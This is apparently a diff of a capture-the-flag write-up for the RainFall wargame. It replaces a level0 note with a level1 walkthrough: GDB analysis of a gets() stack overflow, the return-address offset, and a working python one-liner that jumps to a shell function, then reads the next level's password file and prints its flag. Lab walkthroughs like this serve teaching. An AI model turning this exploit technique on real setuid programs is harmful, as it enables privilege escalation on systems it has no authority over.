@@ -1,17 +1,105 @@
-# in this level, we have level0 a 32bit ELF binray that we need to exploit
+# we have a setuid 32-bit ELF binary 'level1':
+level1@RainFall:~$ ls -l level1
+-rwsr-s---+ 1 level2 users 5138 Mar  6  2016 level1
 
-level0@RainFall:~$ ls -l
-total 732
--rwsr-x---+ 1 level1 users 747441 Mar  6  2016 level0
-level0@RainFall:~$ file level0
-level0: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=0x85cf4024dbe79c7ccf4f30e7c601a356ce04f412, not stripped
+# after running, it's waiting for input, and after the first '\n' it's exiting
+level1@RainFall:~$ ./level1
 
-# the binary's owner is level1 and it's a setuid
+level1@RainFall:~$ ./level1
+aa
+level1@RainFall:~$
 
-# using ghidra: we notice that if we supply 423 as first argument to the program, we'll open a shell with the effective user id which is in this case level1's uid (hence setuid)
+# using ghidra and some assembly analysis (see source.c):
+# there are two important functions: first is 'main', and second is 'run'
+# inside main, we have a call to the vulnerable/deprecated 'gets' function which keeps writing input to the supplied buffer
+# without bound checking => we can exploit this and try to overwrite the return address value and then change control to 'run'
+# the function 'run' will execute a shell (of course with level2 privileges)
 
-level0@RainFall:~$ ./level0 423
-$ whoami
-level1
-$ cat /home/user/level1/.pass	
-1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a
+# using GDB, let's try to find the exact amount of bytes we need to reach the return address bytes in the stack
+# after analyzing the binary's assembly the buffer size is 64byte, which means let's try to overwrite 68bytes with 'A'
+# (64bytes of the buffer + 4bytes of old base pointer value) and 'B' * 4 (as a different pattern for return address):
+
+(gdb) disas main
+Dump of assembler code for function main:
+   0x08048480 <+0>:	push   %ebp
+   0x08048481 <+1>:	mov    %esp,%ebp
+   0x08048483 <+3>:	and    $0xfffffff0,%esp
+   0x08048486 <+6>:	sub    $0x50,%esp
+   0x08048489 <+9>:	lea    0x10(%esp),%eax
+   0x0804848d <+13>:	mov    %eax,(%esp)
+   0x08048490 <+16>:	call   0x8048340 <gets@plt>
+   0x08048495 <+21>:	leave  
+   0x08048496 <+22>:	ret    
+End of assembler dump.
+(gdb) break *0x08048495
+Breakpoint 1 at 0x8048495
+(gdb) run
+Starting program: /home/user/level1/level1 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
+
+Breakpoint 1, 0x08048495 in main ()
+(gdb) print $eip
+$1 = (void (*)()) 0x8048495 <main+21>
+
+# that was first trial, but we still couldn't reach the return address bytes
+# so each time we'll add "A" * 4 to the first pattern until we overwrite the return address bytes with "BBBB"
+# after some trials, we found the perfect offset: 76 ("A" * 76 + "B"):
+
+Dump of assembler code for function main:
+   0x08048480 <+0>:	push   %ebp
+   0x08048481 <+1>:	mov    %esp,%ebp
+   0x08048483 <+3>:	and    $0xfffffff0,%esp
+   0x08048486 <+6>:	sub    $0x50,%esp
+   0x08048489 <+9>:	lea    0x10(%esp),%eax
+   0x0804848d <+13>:	mov    %eax,(%esp)
+   0x08048490 <+16>:	call   0x8048340 <gets@plt>
+   0x08048495 <+21>:	leave  
+   0x08048496 <+22>:	ret    
+End of assembler dump.
+(gdb) break *0x08048495
+Breakpoint 1 at 0x8048495
+(gdb) run
+Starting program: /home/user/level1/level1 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
+
+Breakpoint 1, 0x08048495 in main ()
+(gdb) continue
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+(gdb) print $eip
+$1 = (void (*)()) 0x42424242
+
+# let's now replace the pattern "BBBB" with the address of the first instruction of the function 'run'
+# and let's not forget that the address should be in little endian:
+
+(gdb) disas run
+Dump of assembler code for function run:
+   0x08048444 <+0>:	push   %ebp
+   0x08048445 <+1>:	mov    %esp,%ebp
+   0x08048447 <+3>:	sub    $0x18,%esp
+   0x0804844a <+6>:	mov    0x80497c0,%eax
+   0x0804844f <+11>:	mov    %eax,%edx
+   0x08048451 <+13>:	mov    $0x8048570,%eax
+   0x08048456 <+18>:	mov    %edx,0xc(%esp)
+   0x0804845a <+22>:	movl   $0x13,0x8(%esp)
+   0x08048462 <+30>:	movl   $0x1,0x4(%esp)
+   0x0804846a <+38>:	mov    %eax,(%esp)
+   0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
+   0x08048472 <+46>:	movl   $0x8048584,(%esp)
+   0x08048479 <+53>:	call   0x8048360 <system@plt>
+   0x0804847e <+58>:	leave  
+   0x0804847f <+59>:	ret    
+End of assembler dump.
+
+# 0x08048444 should be overwritten to the return address, but it should be in little endian: "\x44\x84\x04\x08"
+
+# Solution:
+
+level1@RainFall:~$ (python -c 'print "A" * 76 + "\x44\x84\x04\x08"'; cat) | ./level1
+Good... Wait what?
+whoami
+level2
+cat /home/user/level2/.pass
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
